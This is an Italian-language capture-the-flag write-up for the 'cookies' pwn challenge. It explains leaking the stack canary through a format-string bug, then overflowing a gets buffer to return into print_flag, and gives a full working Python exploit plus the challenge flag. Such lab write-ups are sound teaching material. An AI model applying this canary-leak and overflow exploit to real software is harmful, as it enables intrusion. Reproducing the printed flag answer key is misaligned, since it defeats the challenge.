# cookies - PWN (Format String leak + Stack Canary + ret2win)

**Flag:** `CTFlearn{d0_y0u_kn0w_why_s74ck_c00ki3_h4s_4_nu11_by73_1n_17?}`

## Analisi
`vuln()` usa `gets(buf)` (buffer da 16) **due volte** --> overflow. In mezzo fa `printf(buf)` (format string). Esiste `print_flag()` che non viene mai chiamata. Protezioni del binario: **NX + Stack Canary, niente PIE** (indirizzi fissi) --> `print_flag @ 0x401216`.

Piano:
1. Primo `gets` + `printf` --> **leak del canary** (si trova all'offset di formato 9).
2. Secondo `gets` --> **overflow**: riempi 24 byte fino al canary, rimetti il canary, 8 byte per il saved rbp, poi l'indirizzo di `print_flag`.

Offset trovato: il nostro input parte all'offset 6, il canary e' all'offset 9 --> distanza `(9-6)*8 = 24` byte.

## Soluzione - passo per passo
1. Entra nella cartella:
   ```
   cd cookies
   ```
2. Esegui l'exploit (leak canary + overflow nello stesso processo):
   ```
   python3 -c '
   import subprocess, struct, re
   PRINT_FLAG = 0x401216
   p = subprocess.Popen(["./task"], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
   p.stdin.write(b"%9\$p\n"); p.stdin.flush()
   buf = b""
   while b"Second:" not in buf:
       c = p.stdout.read(1)
       if not c: break
       buf += c
   canary = int(re.search(rb"0x[0-9a-f]+", buf).group(), 16)
   payload = b"A"*24 + struct.pack("<Q", canary) + b"B"*8 + struct.pack("<Q", PRINT_FLAG) + b"\n"
   out, _ = p.communicate(payload)
   print((buf + out).decode("latin1"))
   '
   ```
   Output --> `CTFlearn{d0_y0u_kn0w_why_s74ck_c00ki3_h4s_4_nu11_by73_1n_17?}`

> Il nome della sfida e' l'indizio: il canary ha un **null byte** iniziale (`0x..00`), che ferma `strcpy` ma non `gets`.

